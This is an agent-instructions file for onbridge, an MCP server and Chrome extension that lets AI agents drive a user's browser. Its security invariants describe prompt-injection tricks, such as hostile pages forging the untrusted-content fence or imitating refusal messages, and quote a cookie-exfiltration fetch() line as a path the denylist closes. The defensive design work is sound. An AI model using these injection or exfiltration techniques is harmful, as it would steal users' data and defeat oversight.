# onbridge

Browser control execution layer — MCP server + Chrome extension that lets any AI agent control the user's real browser.

These are the instructions for any AI agent working on this repository. `AGENTS.md` is a symlink to this file, so every agent reads the same rules. Human contributors: start with [CONTRIBUTING.md](CONTRIBUTING.md).

## Architecture

```
Agent ──stdio/MCP──> MCP server ──ws://127.0.0.1:9876──> Extension background ──┬─> CDP (trusted input)
                                  Origin-checked                                └─> Content scripts (all frames)
                                  ECDH P-256 + AES-256-GCM
```

## Project Structure

- `packages/shared/` — Protocol types, DOM types, serializer, crypto + handshake
- `packages/mcp-server/` — MCP server (stdio) + encrypted WebSocket bridge
- `packages/extension/` — Chrome Extension (MV3, WXT)

## Development

```bash
pnpm install
./app.sh --build     # build all packages in dependency order
pnpm typecheck       # ALL three packages
pnpm test            # unit + integration
pnpm test:browser    # both browser suites: verify-browser.mjs, then verify-multi-browser.mjs (needs --build first)
```

CI runs typecheck, build and the unit tests; the browser suites run locally. Every suite uses ports 19876–19885, never the real range (see the invariant below).

## Working agreement

- **Discuss before changing.** Propose a change and wait for agreement before editing anything that was not explicitly asked for: workflows, release tooling, other people's scripts, new files or new process. Scope added mid-task is a proposal, not a go-ahead.
- **Keep changes minimal.** When asked to adjust something, make the smallest change that does it. Do not add gates, test suites or new mechanisms to a flow unless asked.

## Writing conventions

- **Never hard-wrap prose at 80 characters, or at any width.** Wrapping is the editor's job. One paragraph, list item or sentence is one line. This applies to everything written for this repo: markdown files, commit message bodies, PR descriptions, issue text, and new code comments. Existing wrapped code comments are left as they are rather than churned.
- Line breaks are for structure only: between paragraphs, list items, table rows, and inside code blocks.

## Invariants worth preserving

These encode bugs that already bit once. Changing them needs a deliberate decision, not a drive-by edit.

- **The bridge binds `127.0.0.1` and checks `Origin`.** WebSockets are exempt from CORS, so any visited page can otherwise reach the port. The Origin check is what excludes remote attackers; do not relax it.
- **The pairing secret is derived, never transmitted**, and must never enter the agent's context or a tool result.
- **Never use a session after an `await`** in `bridge.ts` without re-checking it is still in `this.sessions`. A peer disconnecting mid-handshake previously crashed the whole server.
- **Frame handlers are serialised** through a promise chain on both sides. `hello`/`hello_ack` derives keys the next frame needs, and the replay guard requires monotonic counters. Concurrent handling breaks both.
- **Attach socket listeners synchronously.** Awaiting keypair generation before subscribing dropped the client's first frame and hung the handshake.
- **Policy is enforced in the extension**, not the server. The extension is the trust boundary; server-side checks are advice.
- **Approvals fail closed.** No answer means denied.
- **The approval mode is settable only from the extension's own pages.** There is deliberately no MCP tool for it. An agent that can widen its own permissions makes every prompt theatre. Domain allow/deny lists are enforced in *every* mode, bypass included.
- **The client's probe timeout and the handshake timeout are different numbers.** The probe budget (3s) decides "is anything onbridge-shaped on this port"; the handshake budget (90s, matching the server) has to outlast a human reading the pairing prompt. Collapsing them made the client hang up mid-prompt, retry, and re-prompt — a connect/disconnect storm that looked like a crypto fault.
- **Only the `ConnectionManager` sweep reconnects.** A client that also schedules its own retry produces overlapping reconnect chains, each spawning more. Retired clients set `disposed` so a late callback cannot resurrect one.
- **An agent controls nothing until the user grants it a scope**, and grants may not overlap. This is the isolation boundary between concurrent agents — see `packages/extension/test/scope.test.ts`.
- **Resolve the target tab once, in `handleCommand`.** Individual handlers must not fall back to Chrome's "current window": with two agents on two windows, whichever was focused last would win.
- **Agent identity is pulled, not pushed.** Reading `getClientVersion()` on demand works for clients that never send `notifications/initialized`; wiring it to `oninitialized` alone silently leaves identity as an environment guess forever.
- **`zod` must be >= 4.2** — MCP SDK 2.0 cannot convert zod 3 schemas, and every tool silently fails to register. Do not "fix" this back to zod 3.
- **`@onbridge/shared` must stay bundled** (`noExternal` in tsup): it is private and resolves to raw `.ts`, so an external reference makes the published binary unrunnable.
- **Exactly one shebang** in the built binary — `src/index.ts` has it; do not add a tsup `banner`.
- **Quads and input must use the same CDP session.** A cross-origin iframe is a separate target: its execution contexts are invisible to the tab session (`Target.setAutoAttach` is what surfaces them), and a child session reports *frame-local* coordinates and interprets dispatched input in that same space. Resolving a position on one session and clicking on another silently lands the click wherever that point happens to be in the top document.
- **Frames are matched by the `data-onbridge-frame` marker the snapshot stamps**, not by URL or frame-tree position. Two identical iframes have the same URL, and Chrome's frame ids and CDP's are different namespaces.
- **The pairing window must fail loudly.** New agents are only offered to the user for 60s after control mode is enabled, which is right — but a second agent started an hour into a session is the normal case, and silently refusing it looks like a broken feature. A refusal is recorded and surfaced with a way in.
- **A `pair_confirm` proof is not consent.** It is HMAC'd with a secret derived from the key exchange the peer just performed, so *any* peer can produce a valid one. The user's actual approval lives in the extension and the server cannot see it. Two things stand in for it: `extId` must match the `Origin` Chrome set, and only accepted ids may connect (the official one by default; in development mode, the first extension to pair is pinned). Removing either lets any local process enrol itself — see `test/transport-abuse.test.ts`.
- **`pair_reset` drops the old record only once a new pairing completes.** Deleting it on request made one unauthenticated frame enough to lock the real extension out permanently.
- **A WebSocket close reason is capped at 123 bytes and `ws` throws past it.** Refusal messages go through `closeWithReason`, which truncates for the wire and logs the full text. A message that grew too explanatory turned a clean refusal into an internal error.
- **Tool *failures* are page-controlled too.** A page that throws sends its message verbatim through CDP, the extension and the bridge into `error()`. Fencing only the success path is the half a hostile page would pick.
- **Error provenance travels on the wire (`errorKind`), never inferred from the wording.** Refusals onbridge composed are thrown as `TrustedError` in the extension and marked on the result frame; `error()` frames only those authoritatively and fences everything else. Recognising our own phrasing downstream was the obvious shortcut and is a laundering vector — a page throws `new Error("Blocked by user policy: …")` and is believed. It is not a theoretical dodge: `.name` is attacker-settable and leads the `.stack` that CDP reports, so a page can choose the first bytes of the description. Unmarked means page-derived, which is also what an older extension produces. `errorKind` is taken on trust from the peer, deliberately — a peer that could forge it can already return any result it likes, so this grants no authority it did not already hold. That follows from "the extension is the trust boundary"; it is an acceptance, not an oversight.
- **Domain lists are checked twice: before dispatch and after.** The pre-check (`destinationUrls`) covers destinations the agent names. The post-check (`guardNavigationOutcome`, in a `finally` around `dispatchCommand`) covers how browsers actually move — link clicks, Enter in a form, `evaluate` assigning `location` — none of which appear in any parameter. A blocked outcome reverts the tab and discards the result, snapshot included. Deleting either check reopens the other's blind spot.
- **Navigation intent is recorded from `webNavigation.onBeforeNavigate`, not polled from the tab.** `location.href = …` returns before anything commits, so reading the tab's URL after the command still shows the old page and waves the blocked load through. `evaluate` and `press_key` additionally get a short early-exit settle, because they can start a navigation and return before the browser has announced it; clicks already wait inside their own handler.
- **The post-check also inspects tabs the command opened.** `window.open`, `target="_blank"` and a middle-click put the blocked page in a *different* tab, so the tab being watched never moves and the page would just sit there. Those tabs are judged on `pendingUrl` before the load commits, and closed.
- **The server cannot verify consent, and pinning does not stop impersonation of the pinned id.** Ids are public and a local process can present a matching Origin, so it can reset and re-pair with nobody asked. There is no transport fix — a loopback socket carries no peer identity. The extension detects it instead: a server that forgot a pairing we still hold warns in the pairing prompt, and a stored secret that stops being accepted is reported rather than silently re-paired. Do not "fix" that into an automatic re-pair.
- **Anything a page can influence goes through `pageText`, never `text`.** That includes results that look like status lines: tab titles, console output, cookie names, `evaluate` output, and the snapshots that `navigate`, `click` and `scroll` return. `navigate` is the one that matters most — it is how the agent first reads a hostile page. `test/injection.test.ts` covers every such tool.
- **The fence delimiter carries a per-result id, and page text is neutralised before wrapping.** A fixed literal tag is forgeable: a page whose title, cookie name, thrown error or body contained `</untrusted-page-content>` closed the fence early, and everything after it read to the agent as server-authoritative text. Both defences are load-bearing — the unguessable id means fuzzy matching cannot end the block, and the neutralisation means the boundary cannot even be rendered. The same applies to the `<user-message>` note channel, which uses a distinct tag so neither channel can impersonate the other.
- **The server exits when its agent does.** Nothing in the MCP stdio transport closes the bridge on stdin `end`, and the listening WebSocketServer keeps the event loop alive — so every exited `npx @onllm-dev/onbridge-mcp` run left a zombie holding its port that the extension rediscovered as a live-looking session which never answered. Ten of those exhaust the range and onbridge stops working entirely. `server.ts` wires `onclose`, stdin `end`/`close`, and SIGINT/SIGTERM to `bridge.close()`; do not remove one on the grounds that another covers it.
- **`serverId` is the pairing key, not an instance identity.** It is one value per `~/.onbridge`, so every concurrent server presents the same one. Keying extension sessions on it collapsed two live agents onto one entry and routed each one's results to the other. Sessions are keyed by port — a port hosts one process at a time, so a port *is* an agent.
- **Scope is restored across a reconnect only for the same server, and only if nothing overlaps.** Inheriting it by port alone let a different agent that took a recycled port inherit the previous agent's window, and let a stale grant reappear on top of one the user had since given to someone else.
- **A refusal parks the port on a long backoff, and `arm_pairing` clears it.** Without the backoff the sweep redials within 20s and the user is re-prompted for an agent they just denied; without the clear, the agent they then explicitly invite back is not offered again for minutes.
- **Outbound frames are serialised too, not just inbound.** Counters are taken synchronously but `seal()` is async and unordered, so a heartbeat overlapping a command result could put counter N+1 on the wire before N — which the peer's replay guard treats as an attack and tears the channel down. It presents as a random crypto fault.
- **One live session per browser install, reserved when `hello` is read, before any await.** A server accepts several browsers at once, told apart by the `installId` each sends in `hello` (older extensions send none and share one slot, which is the old single-session behaviour). The session is assigned after an `await`, so the check and the reservation must happen in one synchronous step, or two connections from one install could both pass it and the second clobber the first's in-flight handshake, bypassing the guard that makes a live session un-evictable. `MAX_CONNECTIONS` caps sockets overall.
- **Pairings are keyed by install (`extId#installId`), not by extension id.** Every copy of the store extension shares one `extId`, so a second Chrome profile pairing with an agent overwrote the first profile's secret, and the first then failed auth with the "stored secret not accepted" alarm. A pairing made before install ids lives under the bare `extId`; it is still honoured and moves to the install key the first time an install proves it holds the secret. A reset only ever replaces the install's own record, never the bare one, which may belong to a profile that has not updated yet.
- **Commands go to the browser that granted control most recently** (`target()`): `ready` stamps it, the new `released` message clears it, and with no grant anywhere the most recent connection gets the command and answers with the "ask for control" refusal. The extension sends `ready` on a fresh grant and on a grant restored after a reconnect, and `released` from the panel's hold.
- **`disconnect()` must close a mid-handshake socket.** `ws` is only assigned at ready, so a client disposed during a pairing prompt left its socket open until the 90s timeout; the server holds one live session per browser install, so the extension locked *itself* out of every redial in that window.
- **Never store a pairing secret the server did not receive.** Confirming on a closed socket saved a secret the peer never got, so the next contact looked like the server had reset the pairing — firing the "another program took this agent's place" alarm for an innocent cause, which is how that alarm gets trained away. Check `readyState` before pairing.
- **Refs are localised to their frame *before* policy runs.** The destructive label is read by ref, and a ref inside a cross-origin iframe has no match in the top frame — so an embedded checkout's "Place order · $249" was classified a plain write and passed auto mode without a prompt.
- **`dom_query` is read-only.** It once clicked via `action: 'click'` while classified as a read, which skipped risk approval altogether. Clicks go through the `click` tool: trusted CDP input, classified and destructive-labelled.
- **The denylist is enforced at the network layer too, not only on navigation.** `fetch()` inside `evaluate` reaches a blocked host without navigating, so nothing fires `onBeforeNavigate` and neither the pre-check nor the post-check applies — a clean exfiltration path (`fetch('https://blocked/?c=' + document.cookie)`). `Network.setBlockedURLs` on the attached tab closes it wherever the request originates. Denylist only, deliberately: an allowlist there would block every third-party CDN, font and API and break ordinary pages, which is a different question from where the *browser* may go.
- **Domain lists cover cookie domains and subframe URLs.** `get_cookies` / `set_cookie` name a domain rather than a URL, and a subframe pointed at a blocked host is invisible to the top-frame guards — its DOM would come back in the snapshot. Both are checked; deleting either reopens a path to a blocked origin's data.
- **Timers do not survive MV3 suspension; discovery and idle-revoke use `chrome.alarms`.** A `setInterval` dies whenever the worker is suspended, which is exactly the state the browser is in while waiting for an agent — so a newly started agent was never discovered on a quiet browser. For the same reason `controlEnabledAt`, `pairBlocked` and `lastCommandAt` are persisted: stamping them at cold start re-armed the 60s pairing window on every wake, so a local process only had to wait for a restart to make the browser nag the user.
- **Side-panel notes inform, they do not authorise.** The wording must never tell the agent to treat them as instruction: that hands whatever holds the bridge socket more authority than the untrusted-content fence withholds.
- **Domain lists cover destinations, not just the current tab.** Checking only where the browser already is means `navigate` reaches a blocked site in one call — the page loads and runs before the refusal means anything.
- **An approval is bound to the origin it was granted for.** Re-checked after the user answers, because a page is free to redirect while a prompt sits on screen.
- **Every action in `ALL_COMMAND_ACTIONS` must be classified deliberately** in `policy.ts`. The `write` default is the right failure direction, but three read-only tools sat in it unnoticed and asked for approval in strict mode.
- **A performed action is never reported as a failure.** `click`, `scroll`, `dismiss_modal` and `navigate` return an `ActionResult`, not a `PageSnapshot`: the action's outcome and the page's new state are separate facts. The post-action snapshot is best effort and its absence sets `snapshotError` instead of throwing. Returning a snapshot meant a click that navigated tore down the content script, `serializeSnapshot` threw `snapshot.tree is not iterable`, and the agent was told a click that had already landed had failed — which invites a retry, and a retried click is how an order gets placed twice. `snapshotError` is a fixed phrase, never the underlying error text: it is rendered outside the untrusted fence, and the underlying failure can carry page-chosen words.
- **Anything that can submit reports where the page went.** `type`, `press_key` and `fill_form` do not name a destination anywhere in their parameters, so "Typed successfully" / "Filled 2 fields." left the agent acting on a page it did not know it had left. See `MAY_SUBMIT`.
- **Refs leaving `find`, `list_actions` and `dom_query` are globalised.** Those read the content script's own ref map, which is frame-local, while `snapshot` hands out global refs. Mixing the two numbering schemes in one namespace meant `localiseRefs` translated a `find` ref as though it were global and the command landed on a different element — a silent wrong-element action.
- **Navigation is detected from recorded `webNavigation` intent, not a fixed sleep.** The old code slept 300ms and compared URLs, which was too short on a heavy site: the same call reported "did not navigate" for a click that had, and then failed snapshotting a document being torn down.
- **A page between documents is a retry, not a failure.** Chrome's "Could not establish connection. Receiving end does not exist." is the normal state between a navigation committing and the new content script being injected. `routeToContentScript` re-delivers across it and, if it persists, throws a `RetryableError` carrying `errorCode` on the wire. A code only ever rides on a trusted error — a page-derived one must not be able to present itself as a known onbridge condition.
- **Exactly one server runs the pairing prompt.** A user-scope MCP install spawns one server per editor session, all sharing one `~/.onbridge`. Started together against an empty store, each prompted, each derived a different secret, and the two stores were written independently — so the browser could hold secret B while the file held secret A, and every later handshake failed `invalid auth proof` with no recovery. `claimPairing` takes a cross-process lock; siblings wait and then authenticate against the record the winner wrote. The lock is released only *after* promotion, so a waiting sibling cannot read a half-written pairing.
- **The branch is decided by the frame after `hello_ack`, not by `hello_ack.paired`.** A server that saw no record when it answered `hello` may find one moments later and send `challenge` where it had implied `pair_required`. The extension therefore holds both candidate secrets and chooses when the branching frame arrives. This is why `HANDSHAKE_VERSION` is 3: an older extension commits at `hello_ack` and would answer with the wrong one.
- **`getServerId()` is read once per process and created under a lock.** Re-reading it per call let two concurrent first-runs each generate an id and each overwrite the other's file — so a process announced id X in `hello_ack` and then saved the pairing record under the *other* process's id Y. An identity that moves mid-handshake produces the same orphaned pairing by itself.
- **`peers.json` is keyed by `(peerKey, serverId)` and written under a file lock**, where `peerKey` is `extId#installId` (bare `extId` for pairings made before install ids). A v1 flat-map file is migrated on read and only rewritten on the next write. The second key is what lets the panel forget exactly one pairing.
- **The peer store is written atomically** (a private temporary file renamed into place). Readers take no lock, and an in-place write let another server read a truncated file mid-write and treat an existing pairing as missing. `test/peer-store.test.ts` reads it from a second process while rewriting it.
- **`lastSeen` must advance on use, not only at pairing.** Permanently equal to `pairedAt`, it could not distinguish a live pairing from one abandoned months ago — which is precisely the question "was this record replaced?" needs. Forced on authentication, throttled on the heartbeat.
- **The panel reports what the server can prove, and never asserts a cause.** `auth_fail` carries `PairingEvidence` (pairedAt, lastSeen, store mtime, sibling count). A stale local secret and a hostile takeover give the identical symptom; claiming the hostile reading as fact sent someone hunting for an intruder when the peer file had not been touched in a month.
- **Recovery guidance says to delete the whole peer file.** The careful-looking thing to do with a map is to remove only your own key — and any surviving key keeps trust-on-first-use armed, so the very extension being repaired is then refused with a message about a different problem.
- **`ONBRIDGE_HOME` is resolved per call, never captured at import.** A module constant is fixed the instant anything imports `identity.ts`, so a test that sets the variable afterwards writes into the user's real `~/.onbridge` — which is how a fixture extension id got into a real peer store and turned TOFU against the user's own extension.
- **`extract_text` never answers a scoped read with a bare `""`.** "No such ref", "this element is genuinely empty" and the text itself are three different answers that all used to arrive identically, and an agent reads all three as "this section of the page is empty" and acts on it. The structured walk also falls back to `innerText` rather than reporting nothing.
- **The server accepts only the official extension id by default** (`OFFICIAL_EXTENSION_ID` in `identity.ts`). With no list, trust-on-first-use pins whichever extension connects first, and nothing guaranteed that was ours, so a user who copied the shortest config was one rogue extension away from losing the bridge. Accepting any extension is `ONBRIDGE_ALLOW_ANY_EXTENSION=1`: explicit, logged, never a fallback. The vitest suites run in that mode because they pair fixture ids.
- **Tests run on ports 19876–19885, in both directions.** Their servers listen there (`ONBRIDGE_PORT_BASE`, set in `vitest.config.ts` and in each browser script), and their test browsers scan only there (`onbridge_port_base` in the extension's storage, set by the harness from the extension's own page). Test browsers carry the published extension id, so on the real range they probed the user's real agents and walked them into pairing resets, while the user's browser probed the test servers and showed false refusals; the user's own agents also starved the suites of ports. `verify-multi-browser.mjs` asserts the isolation on every run.
- **A server listens on its agent's first tool call, not at startup** (`connectOnDemand`, wrapped around every tool in `server.ts`). Every editor session starts a server, including sessions that never touch the browser and editors' pre-warmed background processes (`claude bg-spare`); listening at startup made each of them appear in the panel, ask to pair and hold one of the ten ports. `ONBRIDGE_CONNECT=startup` restores the old behaviour, and the test harnesses use it because they pair before calling a tool. A first call waits up to 45s for the browser (the store extension before this change could skip a just-probed empty port for 20s), and up to the handshake budget while a pairing prompt is on screen. The extension no longer backs off a port it found empty, and its suspended-worker sweep alarm runs every 30s, the shortest Chrome allows.
- **Pairing requests queue; they never cancel each other.** The extension holds every agent asking to pair (one per port), the panel lists them all, and each is answered on its own (`resolve_pairing` takes a `port`). Holding one and denying it when the next arrived turned several agents asking at once (a reinstall, or Control Mode switched on with agents already running) into a cascade of denials nobody chose.
- **The browser the user picks wins.** When an agent is paired in one browser, the server withdraws that agent's waiting prompt from every other browser (close 4003 `paired in another browser`, lock released first); the extension treats that as a decision, not a failure: no red refusal, and a long backoff so it does not ask again until the user presses Accept new agents. When control is granted in one browser, the browser that had it gets `control_moved` and puts the agent on hold, so two panels never both claim it.
- **Agent identity comes from each request's `_meta` envelope as well as `initialize`.** Claude Code speaks protocol revision 2026-07-28, which has no `initialize`: the client names itself in every request, and over stdio the SDK never copies that into `getClientVersion()`. The tool wrapper in `server.ts` reads `CLIENT_INFO_META_KEY` from the handler context before connecting, so the pairing prompt already has the right name. Without it every Claude Code session was labelled "guessed". `test/agent-identity.test.ts` speaks the modern revision to prove it.
- **Every server has a connection code** (`AgentIdentity.code`), shown on the panel's pairing request and session card and in the agent's own tool results (not-connected text, the not-granted refusal, `bridge_status`), so the user can match a request to the session on their screen.
- **Allow on a first-time pairing prompt also grants control** of the panel's window at the Grant on approval reach (`pendingGrants`, applied when the handshake finishes, refused as usual on overlap). Later sessions still need their own Give this agent control: pairing is per browser, a grant is per session.
- **`bridge_status` answers before a grant** (it reads no page), and the extension's own "not granted" refusal travels as `errorKind: 'trusted'` with the connection code, instead of being fenced as page text. `get_url` reads Chrome's tab list, so it works on `chrome://` pages and the New Tab page.
- **Releases run on GitHub, never from a local machine.** The version is set in a PR (`./app.sh --bump`) and merged. `.github/workflows/release.yml`, started with `./app.sh --release` or Run workflow in the Actions tab, tags the `main` commit with `v<VERSION>` and then, in the same run, builds the GitHub release and publishes npm (trusted publishing is bound to that exact file name, so do not rename or split it). It runs no test suites: CI gates the PR. A tag pushed by hand still triggers it too. The Chrome Web Store upload is separate, from the release's extension zip.
- **Release notes are written by hand after the release, and attached to the GitHub Release with `gh release edit v<VERSION> --notes-file <file>`.** The workflow does not require or generate them. Proper notes cover: a one-line summary; Install (the npm package URL for that version, the `npx -y @onllm-dev/onbridge-mcp` command, the Claude Code one-liner, the Chrome Web Store link and whether the store version is live yet); Highlights; Improvements; Fixes; Upgrading (restart agent sessions, anything a user must change); Downloads with SHA-256 of the attached files; Contributors, including commits pushed directly rather than through PRs (look up each author's GitHub login); and the compare link.
- **The MCP server ships often; the extension rarely.** npm releases are cheap and reach users on the next `npx` run, while every extension version waits on Web Store review. So a newer server meeting an older extension is the normal case: put new behaviour in the server wherever it can live there (tool descriptions, result formatting, composing existing actions), and when a change needs the extension, batch it into the next store release. Protocol additions must be optional fields that an older peer can ignore. Never bump `HANDSHAKE_VERSION` in the server alone: it is compared exactly, and every installed extension would be locked out.
- **The extension announces the actions it implements in `ready`, and refuses anything else with the trusted code `unsupported-action`** before policy runs. The server checks that list before sending, so an agent is told "this needs a newer extension" instead of getting an opaque failure or, worse, an approval prompt for something that cannot happen. A `ready` without the list means "unknown", never "none", and each `ready` replaces what the server knew.
- **Change-only replies are relative to the last whole page the agent was sent, and never lossy.** An action that stays on the page returns a line diff against a numbered page view (`recordView` and `changesSinceView` in `tools/reply.ts`), so the view plus the reply is exactly the current page text; after a navigation, or when the diff is not clearly smaller, the whole page goes out. Do not diff against a previous diff (the agent would have to replay a chain), and do not trim content to save tokens: a hidden button reads to an agent as a missing one. The same goes for `extract_text`: text past the limit is paged with a stated `offset`, never silently cut.
- **The manifest declares `action` with no `default_popup`** (only `default_icon`, the grey idle set). A popup would take precedence over the side panel and make it a two-click affair.

## Loading the Extension

1. `./app.sh --build`
2. Chrome → `chrome://extensions/` → enable Developer mode
3. Load unpacked → `packages/extension/.output/chrome-mv3/`
4. Click the toolbar icon to open the side panel, then enable Control Mode

## Configuring MCP

```json
{
  "mcpServers": {
    "onbridge": { "command": "npx", "args": ["-y", "@onllm-dev/onbridge-mcp"], "type": "stdio" }
  }
}
```

Local development: `{"command": "tsx", "args": ["packages/mcp-server/src/index.ts"], "type": "stdio"}`

## Tech Stack

- **MCP Server**: Node.js ≥20, TypeScript, `@modelcontextprotocol/server` v2, `ws`, `zod` v4
- **Extension**: WXT, React, Tailwind CSS, TypeScript, `@types/chrome`
- **Shared**: TypeScript, `tsup`, WebCrypto (no crypto dependencies)
- **Testing**: vitest, playwright-core (browser suite uses bundled Chromium — current Chrome ignores `--load-extension`)

## Key Files

| File | Purpose |
|---|---|
| `packages/shared/src/crypto.ts` | ECDH/HKDF/AES-GCM primitives, isomorphic |
| `packages/shared/src/handshake.ts` | Handshake frames, proofs, replay guard |
| `packages/shared/src/serializer.ts` | Compact snapshot text format |
| `packages/mcp-server/src/bridge.ts` | Encrypted WebSocket server, session state machine |
| `packages/mcp-server/src/identity.ts` | Server identity, peer records, Origin policy |
| `packages/mcp-server/src/tools/reply.ts` | Shared result builders — untrusted fencing, user notes |
| `packages/extension/src/core/dom-capture.ts` | DOM distillation, shadow DOM, ref locators |
| `packages/extension/src/core/cdp.ts` | Debugger session manager, console capture |
| `packages/extension/src/core/trusted-input.ts` | Real input via CDP Input domain |
| `packages/extension/src/core/policy.ts` | Risk classification, domain policy |
| `packages/extension/src/core/connection-manager.ts` | Agent discovery on the loopback ports, sessions, grants |
| `packages/extension/src/core/secure-client.ts` | The extension's side of the handshake, stored pairings, install id |
| `packages/extension/src/entrypoints/background.ts` | Command router, frame refs, approvals |
| `packages/extension/src/entrypoints/sidepanel/App.tsx` | The cockpit UI |
| `scripts/verify-browser.mjs`, `scripts/verify-multi-browser.mjs` | The browser suites behind `pnpm test:browser` |
